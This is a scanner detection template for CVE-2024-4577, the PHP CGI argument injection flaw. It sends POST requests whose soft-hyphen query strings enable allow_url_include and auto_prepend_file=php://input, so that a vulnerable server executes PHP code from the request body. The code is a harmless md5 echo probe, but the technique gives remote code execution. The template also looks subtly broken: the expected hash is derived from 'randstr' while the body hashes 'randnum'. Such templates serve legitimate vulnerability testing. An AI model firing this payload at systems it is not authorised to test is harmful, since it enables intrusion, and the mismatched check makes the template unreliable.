id: CVE-2024-4577

info:
  name: PHP CGI - Argument Injection
  author: Hüseyin TINTAŞ,sw0rk17,securityforeveryone,pdresearch
  severity: critical
  description: |-
    PHP CGI - Argument Injection (CVE-2024-4577) is a critical argument injection flaw in PHP.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-4577
  tags: cve,cve2024,php,cgi,rce
  created: 2024/06/11

set:
  randnum: randomInt(1000000, 6666666)
  md5str: md5(randstr)
rules:
  r0:
    request:
      method: POST
      path: /php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
      body: <?php echo md5({{randnum}}); ?>
    expression: response.body.bcontains(bytes(md5str))
  r1:
    request:
      method: POST
      path: /index.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
      body: <?php echo md5({{randnum}}); ?>
    expression: response.body.bcontains(bytes(md5str))
  r2:
    request:
      method: POST
      path: /test.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
      body: <?php echo md5({{randnum}}); ?>
    expression: response.body.bcontains(bytes(md5str))
  r3:
    request:
      method: POST
      path: /test.hello?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
      body: <?php echo md5({{randnum}}); ?>
    expression: response.body.bcontains(bytes(md5str))
expression: r0() || r1() || r2() || r3()
